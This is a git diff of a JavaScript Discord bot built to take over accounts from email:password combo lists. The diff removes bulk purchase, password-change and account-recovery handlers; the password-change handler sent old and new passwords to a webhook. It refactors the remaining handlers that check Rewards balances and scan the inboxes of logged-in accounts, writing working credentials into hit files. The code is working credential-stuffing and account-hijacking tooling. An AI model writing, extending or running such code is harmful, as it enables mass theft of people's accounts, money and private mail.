+        `Active sessions: \`${limiter.getActiveCount()}/${config.MAX_CONCURRENT_USERS}\``,
+        `Authorized users: \`${auth.getAllAuthorized().length}\``,
+        `Blacklisted users: \`${blacklist.getCount()}\``,
+        `Stored WLIDs: \`${getWlidCount()}\``,
+        proxyLine,
+        `Uptime: \`${formatUptime(process.uptime())}\``,
+        `Ping: \`${client.ws.ping}ms\``,
+        `Autopilot: \`${autopilot.isEnabled() ? "ON" : "OFF"}\``,
+      ].join("\n")),
     ],
   });
 }
-
-// ── Blacklist handlers ──────────────────────────────────────
 
 async function handleBlacklist(respond, callerId, targetId, reason) {
   if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Only the bot owner can blacklist users.")] });
@@ -778,13 +636,8 @@ async function handleUnblacklist(respond, callerId, targetId) {
 
 async function handleBlacklistShow(respond) {
   const entries = blacklist.getAll();
-  if (entries.length === 0) {
-    return respond({ embeds: [infoEmbed("Blacklist", "No blacklisted users.")] });
-  }
-  const lines = entries.map((e, i) => {
-    const date = `<t:${Math.floor(e.addedAt / 1000)}:R>`;
-    return `\`${i + 1}.\` <@${e.userId}> — ${e.reason} (${date})`;
-  });
+  if (entries.length === 0) return respond({ embeds: [infoEmbed("Blacklist", "No blacklisted users.")] });
+  const lines = entries.map((e, i) => `\`${i + 1}.\` <@${e.userId}> — ${e.reason} (<t:${Math.floor(e.addedAt / 1000)}:R>)`);
   return respond({ embeds: [infoEmbed("Blacklist", lines.join("\n"))] });
 }
 
@@ -796,558 +649,26 @@ function formatUptime(seconds) {
   return `${d}d ${h}h ${m}m ${s}s`;
 }
 
-// ── Purchase handler ─────────────────────────────────────────
+// ── Account Checker (basic credential validity) ──────────────
 
-async function handlePurchase(respond, userId, accountsRaw, accountsFile, productUrl, dmUser = null) {
-  if (!isOwner(userId)) return respond({ embeds: [ownerOnlyEmbed("Purchaser")] });
+const { checkMicrosoftAccounts } = (() => {
+  try { return require("./utils/microsoft-checker-creds"); } catch { return {}; }
+})();
 
-  const acquire = limiter.acquire(userId, "purchase");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
-
-  const ac = new AbortController();
-  activeAborts.set(userId, ac);
-
-  try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
-    if (!productUrl) return respond({ embeds: [errorEmbed("No product URL or ID provided.")] });
-
-    // Extract product ID from URL or use directly
-    let productId = productUrl.trim();
-    const urlMatch = productId.match(/\/store\/[^/]+\/([a-zA-Z0-9]{12})/i) || productId.match(/\/p\/([a-zA-Z0-9]{12})/i);
-    if (urlMatch) productId = urlMatch[1];
-
-    // If it looks like a search query instead of an ID, search first
-    if (productId.length > 12 || productId.includes(" ")) {
-      const searchResults = await searchProducts(productId);
-      if (searchResults.length === 0) return respond({ embeds: [errorEmbed(`No products found for: ${productId}`)] });
-      
-      const embed = productSearchEmbed(searchResults.slice(0, 5));
-      return respond({ embeds: [embed, infoEmbed("Tip", "Copy the product ID and run the command again with it.")] });
-    }
-
-    // Get product details
-    const product = await getProductDetails(productId);
-    if (!product) return respond({ embeds: [errorEmbed(`Product not found: ${productId}`)] });
-    if (!product.skus || product.skus.length === 0) return respond({ embeds: [errorEmbed(`No purchasable SKUs found for: ${product.title}`)] });
-
-    // Use the first available SKU
-    const sku = product.skus[0];
-
-    let purchased = 0;
-    let failed = 0;
-    let lastResult = null;
-
-    const msg = await respond({
-      embeds: [purchaseProgressEmbed({
-        product: product.title,
-        price: `${sku.price} ${sku.currency}`,
-        done: 0,
-        total: accounts.length,
-        phase: "login",
-        currentAccount: accounts[0]?.split(":")[0] || "",
-        purchased: 0,
-        failed: 0,
-      })],
-      components: [stopButton(userId)],
-      fetchReply: true,
-    });
-
-    let lastUpdate = Date.now();
-    const results = await purchaseItems(
-      accounts,
-      productId,
-      sku.skuId,
-      sku.availabilityId,
-      (phase, detail) => {
-        if (phase === "result") {
-          if (detail.success) purchased++;
-          else failed++;
-          lastResult = { email: detail.email, success: detail.success, orderId: detail.orderId, error: detail.error };
-        }
-
-        const now = Date.now();
-        if (now - lastUpdate > 2000) {
-          lastUpdate = now;
-          updateProgress(msg, purchaseProgressEmbed({
-            product: product.title,
-            price: `${sku.price} ${sku.currency}`,
-            done: detail.done || 0,
-            total: detail.total || accounts.length,
-            phase,
-            currentAccount: detail.email,
-            purchased,
-            failed,
-            lastResult,
-          }), userId);
-        }
-      },
-      ac.signal
-    );
-
-    const stopped = ac.signal.aborted;
-    const files = [];
-    const successful = results.filter(r => r.success);
-    const failedResults = results.filter(r => !r.success);
-
-    if (successful.length > 0)
-      files.push(textAttachment(successful.map(r => `${r.email} | ${r.orderId || "OK"}`), "purchased.txt"));
-    if (failedResults.length > 0)
-      files.push(textAttachment(failedResults.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));
-
-    const embed = purchaseResultsEmbed(results, product.title, `${sku.price} ${sku.currency}`);
-    if (stopped) embed.setTitle("Purchase Results (Stopped)");
-
-    if (dmUser) {
-      try {
-        await dmUser.send({ embeds: [embed], files });
-        await msg.edit({ embeds: [infoEmbed("Purchase Complete", "Results sent to your DMs.")], components: [] });
-      } catch {
-        await msg.edit({ embeds: [embed], files, components: [] });
-      }
-    } else {
-      await msg.edit({ embeds: [embed], files, components: [] });
-    }
-  } catch (err) {
-    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
-  } finally {
-    activeAborts.delete(userId);
-    limiter.release(userId);
-  }
-}
-
-// ── Search handler ───────────────────────────────────────────
-
-async function handleSearch(respond, query) {
-  if (!query) return respond({ embeds: [errorEmbed("Provide a search query.")] });
-
-  const results = await searchProducts(query);
-  if (results.length === 0) return respond({ embeds: [errorEmbed(`No results for: ${query}`)] });
-
-  return respond({ embeds: [productSearchEmbed(results.slice(0, 10))] });
-}
-
-// ── Changer handler ──────────────────────────────────────────
-
-async function handleChanger(respond, userId, accountsRaw, accountsFile, newPassword, threads = 5, dmUser = null) {
-  if (!isOwner(userId)) return respond({ embeds: [ownerOnlyEmbed("Changer")] });
-
-  const acquire = limiter.acquire(userId, "changer");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
-
-  const ac = new AbortController();
-  activeAborts.set(userId, ac);
-
-  try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
-    if (!newPassword) return respond({ embeds: [errorEmbed("No new password provided.")] });
-    if (newPassword.length < 8) return respond({ embeds: [errorEmbed("New password must be at least 8 characters.")] });
-
-    const msg = await respond({
-      embeds: [progressEmbed(0, accounts.length, "Changing passwords")],
-      components: [stopButton(userId)],
-      fetchReply: true,
-    });
-
-    let lastUpdate = Date.now();
-    const results = await changePasswords(accounts, newPassword, threads, (done, total) => {
-      const now = Date.now();
-      if (now - lastUpdate > 2000) {
-        lastUpdate = now;
-        updateProgress(msg, progressEmbed(done, total, "Changing passwords"), userId);
-      }
-    }, ac.signal);
-
-    const stopped = ac.signal.aborted;
-    const files = [];
-    const success = results.filter(r => r.success);
-    const failed = results.filter(r => !r.success);
-
-    if (success.length > 0)
-      files.push(textAttachment(success.map(r => `${r.email}:${r.newPassword}`), "changed.txt"));
-    if (failed.length > 0)
-      files.push(textAttachment(failed.map(r => `${r.email}: ${r.error || "Failed"}`), "failed.txt"));
-
-    const embed = changerResultsEmbed(results);
-    if (stopped) embed.setTitle("Changer Results (Stopped)");
-
-    // Send successful changes to webhook + record stats
-    for (const r of success) {
-      statsManager.record(userId, "changer", true);
-      sendToWebhook(webhookUrl, {
-        email: r.email,
-        oldPassword: r.oldPassword || "N/A",
-        newPassword: r.newPassword,
-        userId,
-      });
-    }
-    for (const r of failed) {
-      statsManager.record(userId, "changer", false);
-    }
-
-    if (dmUser) {
-      try {
-        await dmUser.send({ embeds: [embed], files });
-        await msg.edit({ embeds: [infoEmbed("Changer Complete", "Results sent to your DMs.")], components: [] });
-      } catch {
-        await msg.edit({ embeds: [embed], files, components: [] });
-      }
-    } else {
-      await msg.edit({ embeds: [embed], files, components: [] });
-    }
-  } catch (err) {
-    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
-  } finally {
-    activeAborts.delete(userId);
-    limiter.release(userId);
-  }
-}
-
-// ── Account checker handler ──────────────────────────────────
-
-async function handleAccountChecker(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
-  if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
-
-  const acquire = limiter.acquire(userId, "checker");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
-
-  const ac = new AbortController();
-  activeAborts.set(userId, ac);
-
-  try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
-
-    const msg = await respond({
-      embeds: [progressEmbed(0, accounts.length, "Checking accounts")],
-      components: [stopButton(userId)],
-      fetchReply: true,
-    });
-
-    let lastUpdate = Date.now();
-    const results = await checkAccounts(accounts, threads, (done, total) => {
-      const now = Date.now();
-      if (now - lastUpdate > 2000) {
-        lastUpdate = now;
-        updateProgress(msg, progressEmbed(done, total, "Checking accounts"), userId);
-      }
-    }, ac.signal);
-
-    const stopped = ac.signal.aborted;
-    const files = [];
-    const valid = results.filter((r) => r.status === "valid");
-    const locked = results.filter((r) => r.status === "locked");
-    const invalid = results.filter((r) => r.status === "invalid");
-    const failed = results.filter((r) => r.status !== "valid");
-
-    if (valid.length > 0) files.push(textAttachment(valid.map((r) => `${r.email}`), "valid.txt"));
-    if (locked.length > 0) files.push(textAttachment(locked.map((r) => `${r.email}: Account locked`), "locked.txt"));
-    if (invalid.length > 0) files.push(textAttachment(invalid.map((r) => `${r.email}: Invalid credentials`), "invalid.txt"));
-    if (failed.length > 0) files.push(textAttachment(failed.map((r) => `${r.email}: ${r.error || r.status || "Failed"}`), "failed.txt"));
-
-    const embed = accountCheckerResultsEmbed(results);
-    if (stopped) embed.setTitle("Account Checker Results (Stopped)");
-
-    if (dmUser) {
-      try {
-        await dmUser.send({ embeds: [embed], files });
-        await msg.edit({ embeds: [infoEmbed("Checker Complete", "Results sent to your DMs.")], components: [] });
-      } catch {
-        await msg.edit({ embeds: [embed], files, components: [] });
-      }
-    } else {
-      await msg.edit({ embeds: [embed], files, components: [] });
-    }
-  } catch (err) {
-    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
-  } finally {
-    activeAborts.delete(userId);
-    limiter.release(userId);
-  }
-}
-
-// ── Admin handlers ──────────────────────────────────────────
-
-async function handleAdminPanel(respond, callerId) {
-  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });
-
-  const stats = statsManager.getSummary();
-  const authCount = auth.getAllAuthorized().length;
-  const otpSessions = otpManager.getActiveSessionCount();
-  const activeProcesses = limiter.getActiveCount();
-  const hasWebhook = !!webhookUrl;
-
-  return respond({ embeds: [adminPanelEmbed(stats, authCount, otpSessions, activeProcesses, hasWebhook)] });
-}
-
-async function handleSetWebhook(respond, callerId, url) {
-  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });
-
-  if (!url.startsWith("https://discord.com/api/webhooks/")) {
-    return respond({ embeds: [errorEmbed("Invalid webhook URL format.")] });
-  }
-
-  webhookUrl = url;
-  return respond({ embeds: [successEmbed("Webhook URL configured successfully!")] });
-}
-
-async function handleBotStats(respond, callerId) {
-  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });
-
-  const stats = statsManager.getSummary();
-  const topUsers = statsManager.getTopUsers(5);
-  return respond({ embeds: [detailedStatsEmbed(stats, topUsers)] });
-}
-
-// ── Account Recovery Handler ─────────────────────────────────
-
-async function recoverSingleEmail(email, newPassword, userId) {
-  const result = await initiateRecovery(email);
-  if (!result.success) {
-    return { email, success: false, error: result.error };
-  }
-  if (result.phase === "password_reset") {
-    const pwResult = await submitNewPassword(result, newPassword);
-    statsManager.record(userId, "recover", !!pwResult.success);
-    return { email, success: pwResult.success, message: pwResult.success ? pwResult.message : pwResult.error };
-  }
-  if (result.phase === "captcha_required") {
-    return { email, success: false, error: `CAPTCHA required (${result.captchaInfo.type || "unknown"}) — skipped in bulk mode`, skipped: true, session: result };
-  }
-  if (result.phase === "verify_identity") {
-    return { email, success: false, error: "Identity verification required — skipped", skipped: true };
-  }
-  return { email, success: false, error: `Unexpected phase: ${result.phase}` };
-}
-
-async function handleRecover(respond, userId, emailsRaw, emailsFile, newPassword, threads, dmUser, interaction, message) {
-  if (!isOwner(userId) && !auth.isAuthorized(userId)) {
-    return respond({ embeds: [errorEmbed("Not authorized. Ask the owner to run `/auth`.")] });
-  }
-  if (blacklist.isBlacklisted(userId)) {
-    return respond({ embeds: [errorEmbed("You are blacklisted.")] });
-  }
-  if (!newPassword) {
-    return respond({ embeds: [errorEmbed("Provide the new password to set.")] });
-  }
-
-  // Collect emails from input + file
-  let emails = splitInput(emailsRaw)
-    .map((e) => e.trim().toLowerCase())
-    .map((e) => (e.includes(":") ? e.split(":")[0].trim() : e))
-    .filter((e) => e.includes("@") && !e.includes(" "));
-  if (emailsFile) {
-    const lines = await fetchAttachmentLines(emailsFile);
-    emails = emails.concat(
-      lines
-        .map((l) => l.trim().toLowerCase())
-        .map((l) => (l.includes(":") ? l.split(":")[0].trim() : l))
-        .filter((l) => l.includes("@") && !l.includes(" "))
-    );
-  }
-
-  emails = [...new Set(emails)];
-
-  if (emails.length === 0) {
-    return respond({ embeds: [errorEmbed("No emails provided. Provide email(s) or attach a `.txt` file.")] });
-  }
-  if (emails.length > MAX_COMBO_LINES) {
-    return respond({ embeds: [errorEmbed(`Too many emails. Max ${MAX_COMBO_LINES} lines allowed.`)] });
-  }
-
-  // Single email — original interactive flow (supports CAPTCHA)
-  if (emails.length === 1) {
-    const email = emails[0];
-    await respond({ embeds: [recoverProgressEmbed(email, "Initiating recovery...")] });
-
-    const result = await initiateRecovery(email);
-
-    if (!result.success) {
-      return respond({ embeds: [recoverResultEmbed(email, false, result.error)] });
-    }
-
-    if (result.phase === "password_reset") {
-      const pwResult = await submitNewPassword(result, newPassword);
-      statsManager.record(userId, "recover", !!pwResult.success);
-      return respond({ embeds: [recoverResultEmbed(email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
-    }
-
-    if (result.phase === "captcha_required") {
-      activeRecoverySessions.set(userId, { ...result, newPassword });
-      const captchaType = result.captchaInfo.type || "unknown";
-      let captchaMsg = `CAPTCHA required (type: \`${captchaType}\`).\n\n`;
-      if (result.captchaInfo.type === "hip" && result.captchaInfo.imageUrl) {
-        const imgBuffer = await downloadCaptchaImage(result.captchaInfo.imageUrl, result.cookieJar);
-        if (imgBuffer) {
-          const { AttachmentBuilder } = require("discord.js");
-          const att = new AttachmentBuilder(imgBuffer, { name: "captcha.png" });
-          captchaMsg += "Solve the CAPTCHA below and reply with:\n`/captcha <solution>`\nor `.captcha <solution>`";
-          return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)], files: [att] });
-        }
-      }
-      if (result.captchaInfo.type === "funcaptcha") {
-        captchaMsg += `FunCaptcha site key: \`${result.captchaInfo.siteKey || "N/A"}\`\nPage URL: \`${result.pageUrl}\`\n\n`;
-        captchaMsg += "Solve externally, then: `/captcha <token>`";
-      } else {
-        captchaMsg += "Solve externally, then: `/captcha <solution>`";
-      }
-      return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)] });
-    }
-
-    if (result.phase === "verify_identity") {
-      const options = result.verifyInfo.options.map((o) => `\`${o.index}\`: ${o.label}`).join("\n");
-      return respond({ embeds: [recoverProgressEmbed(email, `Identity verification required.\n\nOptions:\n${options}\n\nNot yet automated.`)] });
-    }
-
-    return respond({ embeds: [recoverResultEmbed(email, false, `Unexpected phase: ${result.phase}`)] });
-  }
-
-  // Bulk mode
-  const concurrency = Math.min(threads || 1, 10);
-  const msg = await respond({ embeds: [recoverProgressEmbed(`${emails.length} emails`, `Starting bulk recovery (${concurrency} threads)...`)] });
-  const editMsg = (opts) => { try { if (msg?.edit) msg.edit(opts); else respond(opts); } catch {} };
-
-  const results = [];
-  let completed = 0;
-
-  // Process in batches
-  for (let i = 0; i < emails.length; i += concurrency) {
-    const batch = emails.slice(i, i + concurrency);
-    const batchResults = await Promise.all(
-      batch.map(email => recoverSingleEmail(email, newPassword, userId))
-    );
-    results.push(...batchResults);
-    completed += batch.length;
-
-    // Update progress
-    const pct = Math.round((completed / emails.length) * 100);
-    const success = results.filter(r => r.success).length;
-    const failed = results.filter(r => !r.success && !r.skipped).length;
-    const skipped = results.filter(r => r.skipped).length;
-    editMsg({ embeds: [recoverProgressEmbed(
-      `${emails.length} emails`,
-      `Progress: ${completed}/${emails.length} (${pct}%)\nSuccess: ${success} | Failed: ${failed} | Skipped (CAPTCHA): ${skipped}`
-    )] });
-  }
-
-  // Build final results
-  const success = results.filter(r => r.success);
-  const failed = results.filter(r => !r.success && !r.skipped);
-  const skipped = results.filter(r => r.skipped);
-
-  const files = [];
-  if (success.length > 0)
-    files.push(textAttachment(success.map(r => `${r.email} | ${r.message || "OK"}`), "recovered.txt"));
-  if (failed.length > 0)
-    files.push(textAttachment(failed.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));
-  if (skipped.length > 0)
-    files.push(textAttachment(skipped.map(r => `${r.email} | ${r.error}`), "skipped.txt"));
-
-  const embed = recoverResultEmbed(
-    `${emails.length} emails`,
-    success.length > 0,
-    `Recovered: ${success.length} | Failed: ${failed.length} | Skipped: ${skipped.length}`
-  );
-
-  const finalOpts = { embeds: [embed], files };
-  editMsg(finalOpts);
-
-  if (dmUser) {
-    try { await dmUser.send(finalOpts); } catch {}
-  }
-}
-
-async function handleCaptchaSolve(respond, userId, solution) {
-  const session = activeRecoverySessions.get(userId);
-  if (!session) {
-    return respond({ embeds: [errorEmbed("No active recovery session. Start one with `/recover` first.")] });
-  }
-
-  await respond({ embeds: [recoverProgressEmbed(session.email, "Submitting CAPTCHA solution...")] });
-
-  const result = await submitCaptchaAndContinue(session, solution);
-
-  if (!result.success) {
-    activeRecoverySessions.delete(userId);
-    return respond({ embeds: [recoverResultEmbed(session.email, false, result.error)] });
-  }
-
-  if (result.phase === "password_reset") {
-    const pwResult = await submitNewPassword(result, session.newPassword);
-    activeRecoverySessions.delete(userId);
-    statsManager.record(userId, "recover", !!pwResult.success);
-    return respond({ embeds: [recoverResultEmbed(session.email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
-  }
-
-  if (result.phase === "captcha_required") {
-    // Another CAPTCHA — update session
-    activeRecoverySessions.set(userId, { ...result, email: session.email, newPassword: session.newPassword });
-    return respond({ embeds: [recoverProgressEmbed(session.email, "Another CAPTCHA required. Solve and reply with `/captcha <solution>` again.")] });
-  }
-
-  activeRecoverySessions.delete(userId);
-  return respond({ embeds: [recoverResultEmbed(session.email, false, `Unexpected result (phase: ${result.phase})`)] });
-}
-
-// ── Rewards handler ─────────────────────────────────────────
+// ── Rewards ──────────────────────────────────────────────────
 
 async function handleRewards(respond, userId, accountsRaw, accountsFile, threads = 3, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "rewards");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
 
   try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, accounts.length, "Checking Rewards Balances")],
@@ -1366,18 +687,16 @@ async function handleRewards(respond, userId, accountsRaw, accountsFile, threads
 
     const stopped = ac.signal.aborted;
     const files = [];
-    const success = results.filter(r => r.success);
-    const failed = results.filter(r => !r.success);
+    const success = results.filter((r) => r.success);
+    const failed = results.filter((r) => !r.success);
 
     if (success.length > 0) {
       files.push(textAttachment(
-        success.map(r => `${r.email} | ${r.balance.toLocaleString()} pts | Level: ${r.levelName} | Lifetime: ${r.lifetimePoints.toLocaleString()} | Streak: ${r.streak}`),
+        success.map((r) => `${r.email} | ${r.balance.toLocaleString()} pts | Level: ${r.levelName} | Lifetime: ${r.lifetimePoints.toLocaleString()} | Streak: ${r.streak}`),
         "rewards_balances.txt"
       ));
     }
-    if (failed.length > 0) {
-      files.push(textAttachment(failed.map(r => `${r.email} | ${r.error}`), "rewards_failed.txt"));
-    }
+    if (failed.length > 0) files.push(textAttachment(failed.map((r) => `${r.email} | ${r.error}`), "rewards_failed.txt"));
 
     const embed = rewardsResultsEmbed(results);
     if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
@@ -1400,31 +719,20 @@ async function handleRewards(respond, userId, accountsRaw, accountsFile, threads
   }
 }
 
-// ── Inbox AIO handler ────────────────────────────────────────
+// ── Inbox AIO ────────────────────────────────────────────────
 
-async function handleInboxAio(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
+async function handleInboxAio(respond, userId, accountsRaw, accountsFile, threads = 3, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "inboxaio");
-  if (!acquire.ok) {
-    const reason = acquire.reason === "busy"
-      ? "You already have a command running. Wait for it to finish."
-      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
-    return respond({ embeds: [errorEmbed(reason)] });
-  }
+  if (!acquire.ok) return respond({ embeds: [errorEmbed(acquire.reason === "busy" ? "You already have a command running." : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached.`)] });
 
   const ac = new AbortController();
   activeAborts.set(userId, ac);
 
   try {
-    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
-    if (accountsFile) {
-      const lines = await fetchAttachmentLines(accountsFile);
-      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
-    }
-
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
-    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+    const accounts = await gatherCombos(accountsRaw, accountsFile);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided.")] });
 
     const startTime = Date.now();
     const liveServiceBreakdown = {};
@@ -1436,8 +744,7 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
     });
 
     let lastUpdate = Date.now();
-    let totalHits = 0;
-    let totalFails = 0;
+    let totalHits = 0, totalFails = 0;
     const results = await checkInboxAccounts(accounts, threads, (done, total, status, hits, fails, lastResult) => {
       totalHits = hits || 0;
       totalFails = fails || 0;
@@ -1450,13 +757,9 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
       if (now - lastUpdate > 2500) {
         lastUpdate = now;
         updateProgress(msg, inboxAioProgressEmbed({
-          completed: done,
-          total,
-          hits: totalHits,
-          fails: totalFails,
+          completed: done, total, hits: totalHits, fails: totalFails,
           elapsed: Date.now() - startTime,
-          latestAccount: lastResult?.user || "",
-          latestStatus: status || "",
+          latestAccount: lastResult?.user || "", latestStatus: status || "",
           serviceBreakdown: { ...liveServiceBreakdown },
         }), userId);
       }
@@ -1465,13 +768,11 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
     const stopped = ac.signal.aborted;
     const elapsed = Date.now() - startTime;
 
-    // Categorize results
-    const hitResults = results.filter(r => r.status === "hit");
-    const failResults = results.filter(r => r.status === "fail");
-    const lockedResults = results.filter(r => r.status === "locked" || r.status === "custom");
-    const twoFAResults = results.filter(r => r.status === "2fa");
+    const hitResults = results.filter((r) => r.status === "hit");
+    const failResults = results.filter((r) => r.status === "fail");
+    const lockedResults = results.filter((r) => r.status === "locked" || r.status === "custom");
+    const twoFAResults = results.filter((r) => r.status === "2fa");
 
-    // Build service breakdown (how many accounts have each service)
     const serviceBreakdown = {};
     for (const r of hitResults) {
       for (const [svcName] of Object.entries(r.services || {})) {
@@ -1479,7 +780,6 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
       }
     }
 
-    // Build per-service file content (new format: services = { Name: { count, subjects } })
     const zipEntries = [];
     const serviceFiles = {};
     for (const r of hitResults) {
@@ -1489,14 +789,11 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
         if (r.name) line += ` | ${r.name}`;
         if (r.country) line += ` | ${r.country}`;
         if (svcData.count) line += ` | Found: ${svcData.count}`;
-        if (svcData.subjects && svcData.subjects.length > 0) {
-          line += ` | Subjects: ${svcData.subjects.slice(0, 5).join(", ")}`;
-        }
+        if (svcData.subjects?.length > 0) line += ` | Subjects: ${svcData.subjects.slice(0, 5).join(", ")}`;
         serviceFiles[svcName].push(line);
       }
     }
 
-    // Per-service files
     for (const [svcName, lines] of Object.entries(serviceFiles)) {
       if (lines.length > 0) {
         const safeName = svcName.replace(/[^a-zA-Z0-9]/g, "_").toLowerCase();
@@ -1504,9 +801,8 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
       }
     }
 
-    // All hits combined
     if (hitResults.length > 0) {
-      const allHitLines = hitResults.map(r => {
+      const allHitLines = hitResults.map((r) => {
         const svcs = Object.entries(r.services || {}).map(([n, d]) => `${n}(${d.count})`).join(", ");
         let line = `${r.user}:${r.password}`;
         if (r.name) line += ` | ${r.name}`;
@@ -1517,34 +813,17 @@ async function handleInboxAio(respond, userId, accountsRaw, accountsFile, thread
       });
       zipEntries.push({ name: "all_hits.txt", content: allHitLines.join("\n") });
     }
-
-    // Failed
-    if (failResults.length > 0) {
-      zipEntries.push({ name: "failed.txt", content: failResults.map(r => `${r.user}:${r.password} | ${r.detail || "failed"}`).join("\n") });
-    }
-
-    // Locked / 2FA
-    if (lockedResults.length > 0) {
-      zipEntries.push({ name: "locked.txt", content: lockedResults.map(r => `${r.user}:${r.password}`).join("\n") });
-    }
-    if (twoFAResults.length > 0) {
-      zipEntries.push({ name: "2fa.txt", content: twoFAResults.map(r => `${r.user}:${r.password}`).join("\n") });
-    }
+    if (failResults.length > 0) zipEntries.push({ name: "failed.txt", content: failResults.map((r) => `${r.user}:${r.password} | ${r.detail || "failed"}`).join("\n") });
+    if (lockedResults.length > 0) zipEntries.push({ name: "locked.txt", content: lockedResults.map((r) => `${r.user}:${r.password}`).join("\n") });
+    if (twoFAResults.length > 0) zipEntries.push({ name: "2fa.txt", content: twoFAResults.map((r) => `${r.user}:${r.password}`).join("\n") });
 
     const embed = inboxAioResultsEmbed({
-      total: results.length,
-      hits: hitResults.length,
-      fails: failResults.length,
-      locked: lockedResults.length,
-      twoFA: twoFAResults.length,
-      elapsed,
-      serviceBreakdown,
-      username: dmUser?.username,
+      total: results.length, hits: hitResults.length, fails: failResults.length,
+      locked: lockedResults.length, twoFA: twoFAResults.length,
+      elapsed, serviceBreakdown, username: dmUser?.username,
     });
     if (stopped) embed.setDescription(embed.data.description + "\n\n*Stopped -- partial results*");
 
-    // Bundle all results into a single ZIP file
